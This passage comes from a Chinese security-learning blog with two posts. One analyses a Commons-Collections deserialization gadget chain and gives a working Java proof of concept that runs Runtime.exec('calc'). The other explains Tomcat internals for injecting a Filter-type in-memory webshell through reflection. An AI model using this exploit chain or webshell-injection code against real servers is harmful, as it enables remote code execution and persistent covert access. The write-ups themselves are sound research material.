class="comment">//这里利用key的hashcode计算出在hash表中的index</span></span><br><span class="line">        <span class="keyword">for</span> (Entry&lt;?,?&gt; e = tab[index] ; e != <span class="keyword">null</span> ; e = e.next) &#123;</span><br><span class="line">            <span class="comment">//这里检查已经在index位置上的元素的hash是否与其相等,相等的话则调用equals方法</span></span><br><span class="line">            <span class="keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> java.io.StreamCorruptedException();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Creates the new entry.</span></span><br><span class="line">        <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">            Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;)tab[index];</span><br><span class="line">        tab[index] = <span class="keyword">new</span> Entry&lt;&gt;(hash, key, value, e);</span><br><span class="line">        count++;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>到这里逻辑就基本清楚了,就是送入两个值一样的<code>map</code>,让他们的<code>key</code>在这里触发<code>equals</code>方法,</p>
<blockquote>
<p>来捋一捋调用链的流程</p>
</blockquote>
<p>首先需要满足Hashtable中的两个元素的hashCode相等,那么这里是怎么计算hashCode的呢</p>
<img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220331224615938.png" alt="image-20220331224615938" style="zoom:67%;" />

<p>起初tab是空的,反序列化取出第一个元素后才会进入for循环,其中e.hash是第一个元素的hash值,这里的hash来自于key的hashCode,而Hashtable的key是构造好的lazyMap,由于if语句中执行顺序的关系,需要先满足第一个条件才会接着执行下一个条件的语句</p>
<p>由于此时求得是lazyMap的hashCode,所以直接去看lazyMap的hashCode方法,但是lazyMap没有hashCode方法,找到它继承的抽象父类<code>AbstractMapDecorator</code>里面有hashCode方法,和equls一样,它也调用的是当前map的方法</p>
<img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220331225017982.png" alt="image-20220331225017982" style="zoom:67%;" />

<p>由于map实际上是<code>HashMap</code>类型的,所以直接去看<code>HashMap</code>的<code>hashCode</code>,它里面也没有<code>hashCode</code>方法,在它的抽象父类<code>AbstractMap</code>中找到了<code>hashCode</code>方法</p>
<img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220331225222273.png" alt="image-20220331225222273" style="zoom:67%;" />

<p>这里的i.next().hashCode调用了Object的hashCode分别计算key和value的hash并做异或</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> Objects.hashCode(key) ^ Objects.hashCode(value);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>Object的hashCode方法只要传入的参数不为null,则调用该参数自身的hashCode</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">(Object o)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> o != <span class="keyword">null</span> ? o.hashCode() : <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>对于key来说,也就是String 的hashCode</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       <span class="keyword">int</span> h = hash;</span><br><span class="line">       <span class="keyword">if</span> (h == <span class="number">0</span> &amp;&amp; value.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">           <span class="keyword">char</span> val[] = value;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; value.length; i++) &#123;</span><br><span class="line">               h = <span class="number">31</span> * h + val[i];</span><br><span class="line">           &#125;</span><br><span class="line">           hash = h;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> h;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>而value Integer类型的hashCode函数则返回其本身</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">(<span class="keyword">int</span> value)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>根据String计算hashCode的方式编写找hashCode相等的字符串的脚本:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="comment">#获取全部字母的数组</span></span><br><span class="line">letter=string.ascii_letters</span><br><span class="line"><span class="built_in">print</span>(letter)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hashCode</span>(<span class="params"><span class="built_in">str</span></span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">31</span>*<span class="built_in">ord</span>(<span class="built_in">str</span>[<span class="number">0</span>])+<span class="built_in">ord</span>(<span class="built_in">str</span>[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#随机组合成两个的字符串</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> letter:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> letter:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> letter:</span><br><span class="line">            <span class="keyword">for</span> l <span class="keyword">in</span> letter:</span><br><span class="line">                str1=i+j</span><br><span class="line">                str2=k+l</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (str1!=str2 <span class="keyword">and</span> hashCode(str1)==hashCode(str2)):</span><br><span class="line">                    <span class="built_in">print</span>(str1+<span class="string">&quot;  hash===  &quot;</span>+str2)</span><br></pre></td></tr></table></figure>

<p>首先通过Hashtable的readObject触发<code>Hashtable.reconstitutionPut</code>,由于<code>yy</code>和<code>zZ</code>的hashCode相等,所以触发<code>equals</code>方法,LazyMap是没有equals方法的,但是它继承的抽象类<code>AbstractMapDecorator</code>实现了<code>equals</code>方法</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220331011008494.png" alt="image-20220331011008494"></p>
<p>它只要判断传入的对象不是当前对象,则调用map的equals方法,这里的map就是lazyMap中的map属性,由于起初lazyMap初始化的时候map传递的是<code>HashMap</code>,所以会调用<code>HashMap</code>的<code>equals</code>方法,但是HashMap并没有<code>equals</code>方法,但是它继承的抽象父类<code>AbstractMap</code>有,map属性需要满足3条就可以,<code>1.不是同一对象2.实现了Map接口3.o和当前map 的元素个数相等</code></p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220331011543850.png" alt="image-20220331011543850"></p>
<p>接着就会调用map的get,虽然o被转型为了Map,但是其本质上还是LazyMap,所以这里调用<code>m.get</code>就相当于调用了<code>lazyMap2.get</code>至于这里调用的是第二个lazyMap的get但是为什么key是”yy”而不是”zz”原因还是序列化的时候的那一波出入栈操作<img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220331012704699.png" alt="image-20220331012704699"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers= <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer Chainedtransform = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[]&#123;&#125;);</span><br><span class="line">    	<span class="comment">//可以替换为 ... = new ChainedTransformer(new Transformer[]&#123;new ConstantTransformer(0)&#125;);</span></span><br><span class="line"></span><br><span class="line">        Map innerMap1 = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map innerMap2 = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line">        Map lazyMap1 = LazyMap.decorate(innerMap1, Chainedtransform);</span><br><span class="line">        Map lazyMap2 = LazyMap.decorate(innerMap2, Chainedtransform);</span><br><span class="line">        lazyMap1.put(<span class="string">&quot;yy&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        lazyMap2.put(<span class="string">&quot;zZ&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        Hashtable hashtable = <span class="keyword">new</span> Hashtable();</span><br><span class="line">        hashtable.put(lazyMap1, <span class="number">1</span>);</span><br><span class="line">        hashtable.put(lazyMap2, <span class="number">2</span>);</span><br><span class="line">        lazyMap2.remove(<span class="string">&quot;yy&quot;</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;lazyMap1 hashcode:&quot;</span> + lazyMap1.hashCode());</span><br><span class="line">        System.out.println(<span class="string">&quot;lazyMap2 hashcode:&quot;</span> + lazyMap2.hashCode());</span><br><span class="line"></span><br><span class="line">        Class&lt;? extends Transformer&gt; chainedtransformClass = Chainedtransform.getClass();</span><br><span class="line">        Field iTransformers = chainedtransformClass.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        iTransformers.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        iTransformers.set(Chainedtransform,transformers);</span><br><span class="line"></span><br><span class="line">        SerializeTest.serialize(hashtable);</span><br><span class="line">        UnSerializeTest.unserialize(<span class="string">&quot;C:\\Temp\\test.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>









<h5 id="为什么会lazyMap2会多出一个”yy-yy”"><a href="#为什么会lazyMap2会多出一个”yy-yy”" class="headerlink" title="为什么会lazyMap2会多出一个”yy=yy”"></a>为什么会lazyMap2会多出一个”yy=yy”</h5><p>hashTable在put的时候会调用</p>
<img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220331180337409.png" alt="image-20220331180337409" style="zoom:80%;" />

<p>entry.key.equals(key),  entry.key是lazyMap1, key也就是lazyMap2,然后会调用到<code>AbstractMap.equals</code>(lazyMap2)</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220331172723005.png" alt="image-20220331172723005"></p>
<p>在里面会调用到lazyMap2的get方法,这里传进去的参数<code>key</code>是第一个lazyMap的key, <code>m</code>代表的是lazyMap2,调用了第二个<code>lazyMap的get(&quot;yy&quot;)</code>,由于<code>&quot;yy&quot;</code>在lazyMap2中不存在,所以会调用<code>ChainedTransformer.transform(&quot;yy&quot;)</code></p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220331173811180.png" alt="image-20220331173811180"></p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220331173729480.png" alt="image-20220331173729480"></p>
<p>由于当前的itransform数组长度为0,所以返回的是”yy”,</p>
<p>接着<code>LazyMap.get</code>方法把传入的key当key,transform(key)得到的值当成value,put一个<code>entry</code>进到lazyMap2里面,也就是”yy=”yy”</p>
<blockquote>
<p>起初为了防止在put的时候就执行代码,我用了<code>ConstantTransformer(1)</code>代替了<code>Tranformer</code>数组,但是出现了put不成功的情况,只能putLazyMap进去,这个问题需要探究一下</p>
</blockquote>
<p>接着上面的分析,最后给下面画红线的地方中equals()中的值就是上面最后transform返回的结果,value是Hashtable中第一个entry的value,也就是1,所以这块是<code>1.equals(  )</code>,只要不是1就满足结果</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220331182218564.png" alt="image-20220331182218564"></p>
<h5 id="为什么要remove"><a href="#为什么要remove" class="headerlink" title="为什么要remove()"></a>为什么要remove()</h5><p>因为在调用到<code>AbstractMap.equals</code>的时候,会判断两个map的长度是否一致,如果不一致则不会进行下面的get调用了</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220331174106161.png" alt="image-20220331174106161"></p>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>commons-collections</tag>
      </tags>
  </entry>
  <entry>
    <title>tomcat内存马学习</title>
    <url>/2022/04/17/tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<blockquote>
<p>参考引用</p>
<p><a href="https://javasec.org/javaweb/MemoryShell">https://javasec.org/javaweb/MemoryShell</a></p>
</blockquote>
<h2 id="Filter型内存马"><a href="#Filter型内存马" class="headerlink" title="Filter型内存马"></a>Filter型内存马</h2><h5 id="调试前的准备"><a href="#调试前的准备" class="headerlink" title="调试前的准备"></a>调试前的准备</h5><p>首先配置环境和调试用的代码</p>
<p>新建java-web maven项目,在pom.xml中导入对应依赖</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.11<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--Servlet 依赖--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javax.servlet-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--JSP依赖--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet.jsp<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javax.servlet.jsp-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.3.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--JSTL表达式的依赖--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet.jsp.jstl<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jstl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--standard标签库--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>taglibs<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>standard<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>接着在filter处打断点,debug,但是出现了无法在此处step into的问题,和之前一样,去下载tomcat的源码给sourcepath中添加tomcat源码目录,调试的时候能正常进入,但是有很多报红,并不影响代码跟进调试,之后再解决这个问题</p>
<p>好吧,我是儍狗,原来maven可以直接导入tomcat依赖然后下载源码……</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-catalina<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>9.0.58<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>



<blockquote>
<p>接下来跟进到代码,跟进filter的代码流程</p>
</blockquote>
<p>首先进入doFilter方法中,会直接进入<code>internalDoFilter()</code>方法中,这个才是Tomcat中真正实现过滤的类</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220417184815764.png" alt="image-20220417184815764"></p>
<p>当到最后一个Filter,就会调用对应servlet的service方法</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220417185013757.png" alt="image-20220417185013757"></p>
<p>总而言之,所有Filter就是一条独木桥上面的木板,少了哪一块都会导致后面的Filter的doFilter方法调用不到从而导致调用不到对应Servlet的service方法</p>
<p>在tomcat的组成中,一部分为服务器用于与外界交流,一部分是容器,里面运行的就是servlet,filter….</p>
<h5 id="tomcat和servlet的关系"><a href="#tomcat和servlet的关系" class="headerlink" title="tomcat和servlet的关系"></a>tomcat和servlet的关系</h5><p>Tomcat将http请求文本接收并解析,然后封装成HttpServletResquest类型的request对象,</p>
<p>servlet将要响应的信息封装成HttpServletResponse对象给tomcat,tomcat就会将其编程响应文本的格式发送给浏览器</p>
<h4 id="容器组件Container"><a href="#容器组件Container" class="headerlink" title="容器组件Container"></a>容器组件Container</h4><p> 容器代表一类组件，这类组件的作用就是接收客户端请求并返回响应数据，具体操作委派到子组件完成。</p>
<p>​    Engine、Host、Context、Wrapper均继承自Container</p>
<p>Tomcat中的Container用于封装和管理Servlet,以及具体处理Request请求,在Container中包含了四个子容器</p>
<h5 id="Engine"><a href="#Engine" class="headerlink" title="Engine"></a>Engine</h5><p>​        最顶层容器组件,其下可以包含多个Host</p>
<p>实现类为<code>org.apache.catalina.core.StandardEngine</code></p>
<h5 id="Host"><a href="#Host" class="headerlink" title="Host"></a>Host</h5><pre><code>     为了提供对多个域名的服务，我们可以将每个域名视为一个虚拟的主机。在每个Host下包含多个Context
</code></pre>
<p>实现类为<code>org.apache.catalina.core.StandardHost</code></p>
<h5 id="Context"><a href="#Context" class="headerlink" title="Context"></a>Context</h5><p>​        一个Context代表一个Web应用,其下可以包含多个Wrapper</p>
<p>实现类为<code>org.apache.catalina.core.StandardContext</code></p>
<h5 id="Wrapper"><a href="#Wrapper" class="headerlink" title="Wrapper"></a>Wrapper</h5><p>​        一个Wrapper代表一个Servlet</p>
<p>实现类为<code>org.apache.catalina.core.StandardWrapper</code></p>
<p>总而言之,Host是主机,Context是web应用,wrapper是servlet</p>
<h5 id="一些会用到的类"><a href="#一些会用到的类" class="headerlink" title="一些会用到的类"></a>一些会用到的类</h5><p>FilterDefs:</p>
<p>存放FilterDef的数组,,FilterDef中存放这过滤器名,过滤器实例,作用url等基本信息,(调试的时候没找到作用url的成员变量)</p>
<p>FilterConfigs:存放FilterConfig的数组,FilterConfig主要存放FilterDef和Filter对象等信息</p>
<p>FilterMaps:存放FilterMap数组,在FilterMap中主要存放了FilterName和对应的URLPattern    </p>
<img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220418151626862.png" alt="image-20220418151626862" style="zoom:50%;" />

<p>FilterChain: 过滤器链,该对象上的doFilter方法能依次调用链上的Filter</p>
<p>StandardContext: Context接口的标准实现类,一个Context代表一个Web应用,其下可以包含多个Wrapper(servlet)</p>
<p>StandardWrapperValve: 一个Wrapper的标准实现类,一个Wrapper代表一个Servlet</p>
<p>在StandardWrapperValue中会利用ApplicationFilterFactory来创建filterChain</p>
<img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220418152549816.png" alt="image-20220418152549816" style="zoom:67%;" />

<p>在<code>ApplicationFilterFactory</code>中的createFilterChain方法中,首先通过getParent获取当前wrapper的爹,也就是Context,然后获取到当前context中的所有filterMap,我自己写的是testFilter1和testFilter2两个</p>
<img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220418153140872.png" alt="image-20220418153140872" style="zoom:80%;" />

<p>接下来</p>
<img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220418153636868.png" alt="image-20220418153636868" style="zoom:80%;" />

<p>会对FilterMap进行遍历,如果当前请求中的url与遍历中的filterMap相对应,则把filterMap对应的FilterConfig添加到filterChain中去</p>
<p>添加完成后会调用doFilter方法</p>
<p>doFilter方法会调用internalDoFilter方法,该方法会依次从filters中取出filterConfig,调用filter的doFilter方法,从而调用到过滤器中重写的doFilter方法,触发自定义的代码</p>
<img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220418154301503.png" alt="image-20220418154301503" style="zoom:80%;" />



<p>要想实现动态添加filter,首先要获取到context,因为根据前面的分析,filterMaps是通过context获取到的</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220418155818702.png" alt="image-20220418155818702"></p>
<p>按照大佬的方法,首先web容器启动的时候会为每个web应用创建一个ServletContext对象,代表当前应用,而有一个类很特殊,就是<code>ApplicationContext</code>类,它是ServletContext的实现类,并且它的成员变量中包含了<code>context</code>的标准实现类<code>StandardContext</code></p>
<img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220418160009434.png" alt="image-20220418160009434" style="zoom:67%;" />

<p>可以通过反射来获取到它的这个成员变量,即为当前的context,然后就可以添加filterMaps,进行一系列操作了</p>
<p>获取到context后,就可以进行动态注入filter了,但是注入之前要明确注入的参数,注入内存马实际上是在模拟写xml文件的过程</p>
<p>filterDefs存放了filter的定义,对应的类和名称就相当于web.xml中这部分代码</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>testFilter1<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>com.test.filter.testFilter1<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>filterMaps存放了filter的路径和对应filter的对应关系,还暗含了filter的调用顺序,相当于这部分代码</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>testFilter1<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>FilterConfigs</p>
<p>存放了FilterConfig数组,在FilterConfig中主要存放FilterDef和Filter对象的信息,调用的时候就是从这里面获取的filter</p>
<p>这里不得不提到一点,就是getClass方法得到的其实是能代表当前对象真正运行的类(Class)的对象</p>
<p>翻译的有点奇怪….,反正就是注意声明类型和实际类型的问题</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220420112130648.png" alt="image-20220420112130648"></p>
<p>ServletContext接口当前正在运行的对象所对应的类就是ApplicationContextFacade</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220418232736182.png" alt="image-20220418232736182"></p>
<p>而这个类中的Context的类型是ApplicationContext</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220418233017639.png" alt="image-20220418233017639"></p>
<p><code>ApplicationContext</code>中有<code>StandardContext</code>类型的成员变量<code>context</code>,通过这样就能获取到对应的<code>context</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ServletContext servletContext = request.getSession().getServletContext();</span><br><span class="line">    Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">//这里获取到的class是ApplicationContextFacade</span><br><span class="line">    appctx.setAccessible(true);</span><br><span class="line">        // ApplicationContext 为 ServletContext 的实现类</span><br><span class="line">    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span><br><span class="line"></span><br><span class="line">    Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">    stdctx.setAccessible(true);</span><br><span class="line">        // standardContext为context接口标准实现类</span><br><span class="line">    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span><br></pre></td></tr></table></figure>

<h4 id="添加filter到当前context"><a href="#添加filter到当前context" class="headerlink" title="添加filter到当前context"></a>添加filter到当前context</h4><p>根据之前学习的相关参数包含顺序,由内到位依次创建</p>
<p>首先创建filterDef,包含filter的类和名称等信息</p>
<p>并添加到当前context中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">FilterDef filterDef=<span class="keyword">new</span> FilterDef();</span><br><span class="line">    filterDef.setFilter(filter);</span><br><span class="line">    filterDef.setFilterName(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">    filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">standardContext.addFilterDef(filterDef);</span><br></pre></td></tr></table></figure>



<p>接着创建filterMap,里面包含filter名称和路径的映射关系</p>
<p>并添加到context中,在添加之前还需要设置filterMap的状态,一般设置成REQUEST的状态</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">FilterMap filterMap=<span class="keyword">new</span> FilterMap();</span><br><span class="line">    filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">    filterMap.setFilterName(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">    filterMap.setDispatcher(DispatcherType.REQUEST.name());<span class="comment">//添加的是当前diepatcher类型的名字</span></span><br><span class="line">    standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"><span class="comment">//addFilterMapBefore可以将当前的filter添加到filterChain第一个</span></span><br></pre></td></tr></table></figure>



<p>在设置状态这里,</p>
<p>有一说一,学习计算机还得英语好,起初对于这段代码有点不解,点开之后看见了作者的注释,就都明白了,为什么非要设置这个东西呢,就是为了设置当前filterMap的状态,它可以用来代表filter被应用的时候的状态</p>
<p>Dispatcher本意是调度员的意思</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">filterMap.setDispatcher(DispatcherType.REQUEST.name());<span class="comment">//添加的是当前diepatcher类型的名字</span></span><br></pre></td></tr></table></figure>



<img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220419132233195.png" alt="image-20220419132233195" style="zoom:67%;" />

<p>最后是filterConfig这个东西了</p>
<p>filterConfig是一个接口,真正运行的它的类是ApplicationFilterConfig,所以需要新建一个ApplicationFilterConfig对象,添加到当前正在运行的context的filterConfigs中去(注意这里是复数)</p>
<p>分解成两个问题</p>
<p>1.自定义一个ApplicationFilterConfig对象</p>
